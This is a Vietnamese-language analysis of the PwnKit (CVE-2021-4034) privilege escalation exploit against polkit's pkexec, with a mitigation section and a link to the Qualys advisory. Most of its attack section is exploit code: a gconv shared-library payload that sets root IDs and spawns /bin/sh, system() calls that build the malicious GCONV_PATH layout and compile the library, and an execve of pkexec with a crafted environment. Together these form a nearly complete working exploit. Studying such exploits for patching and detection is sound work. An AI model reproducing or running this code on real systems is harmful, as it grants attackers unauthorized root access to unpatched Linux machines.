# CVE-2021-4034 (PwnKit) - Phân tích mã khai thác

## Giới thiệu

CVE-2021-4034 (PwnKit) là một lỗ hổng leo thang đặc quyền cục bộ được phát hiện trong công cụ pkexec của polkit. Lỗ hổng này cho phép người dùng thông thường có thể đạt được quyền root trên hệ thống Linux.

## Phân tích mã khai thác

### 1. Cấu trúc chính của mã

Mã khai thác bao gồm hai phần chính:
- Mã shellcode được nhúng dưới dạng chuỗi C
- Hàm main thực hiện việc chuẩn bị và kích hoạt khai thác

### 2. Phân tích chi tiết

#### Phần shellcode:
```c
char *shell = 
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n\n"
    "void gconv() {}\n"
    "void gconv_init() {\n"
    "	setuid(0); setgid(0);\n"
    "	seteuid(0); setegid(0);\n"
    "	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
    "	exit(0);\n"
    "}";
```

Đoạn mã này sẽ:
1. Thiết lập UID và GID về 0 (root)
2. Khôi phục PATH gốc
3. Dọn dẹp các file tạm thời
4. Mở một shell với quyền root

#### Các bước khai thác:

1. Tạo cấu trúc thư mục và file cần thiết:
```c
system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
```

2. Tạo và biên dịch thư viện động chứa mã khai thác:
```c
fp = fopen("pwnkit/pwnkit.c", "w");
fprintf(fp, "%s", shell);
fclose(fp);
system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
```

3. Chuẩn bị môi trường và thực thi pkexec:
```c
char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
execve("/usr/bin/pkexec", (char*[]){NULL}, env);
```

## Cách thức hoạt động

1. Khai thác lợi dụng cách pkexec xử lý biến môi trường không an toàn
2. Sử dụng cơ chế gconv của Linux để thực thi mã tùy ý
3. Thông qua việc điều khiển biến môi trường, mã khai thác có thể chạy với quyền root

## Biện pháp phòng chống

1. Cập nhật polkit lên phiên bản mới nhất
2. Giới hạn quyền thực thi pkexec
3. Theo dõi và giám sát các hoạt động liên quan đến pkexec

## Tham khảo

- [Qualys Security Advisory](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
- Tác giả: Andris Raugulis <moo@arthepsy.eu>
